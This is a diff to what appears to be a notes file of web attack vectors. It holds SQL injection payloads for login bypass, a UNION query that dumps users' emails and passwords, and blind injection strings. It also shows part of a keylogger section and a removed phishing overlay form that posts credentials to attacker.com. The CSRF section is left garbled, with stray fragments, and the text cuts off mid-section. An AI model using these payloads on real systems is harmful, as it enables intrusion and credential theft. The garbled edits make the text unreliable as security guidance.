@@ -14,16 +14,11 @@ a) Login Bypass:
    Query becomes: SELECT * FROM users WHERE email='admin" OR "1"="1' AND pass='anything'
    
    Alternative:
-   - Email: " OR ""="
+   - Email: " OR ""="' OR 1=1 -- 
    - Password: anything
    
    Query becomes: SELECT * FROM users WHERE email='" OR ""="' AND pass='anything'
    
-   For MariaDB specific:
-   - Email: admin' #
-   - Password: anything
-   
-   Query becomes: SELECT * FROM users WHERE email='admin' #' AND pass='anything'
    
 b) UNION Attack:
    - Search: ' UNION SELECT 1,concat(email,':',pass),3 FROM users -- 
@@ -31,7 +26,8 @@ b) UNION Attack:
    This reveals all usernames and passwords in a single result.
 
 c) Blind SQL Injection:
-   - Email: admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a
+   - Email: admin@example.com' AND SUBSTRING((SELECT pass FROM users WHERE id=1),1,1)='a' -- 
+
    
    By iterating through characters and positions, the attacker can extract data even 
    when error messages are suppressed.
@@ -55,22 +51,15 @@ b) Keylogger:
    });
    </script>
 
-c) Phishing Form:
-   <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999">
-     <h2>Session Expired</h2>
-     <form action="https://attacker.com/steal.php">
-       Email: <input name="email"><br>
-       Password: <input type="password" name="password"><br>
-       <button>Login Again</button>
-     </form>
-   </div>
 
 
 3. CSRF ATTACK VECTORS
 ----------------------
 
-a) Hidden Form Method:
-   Create an invisible form that automatically submits, transferring money to attacker's account.
+Phishing Form:
+  CSRF website cookie stealer
+
+
 
 b) IMG Tag Method:--eng-brk
 <script>
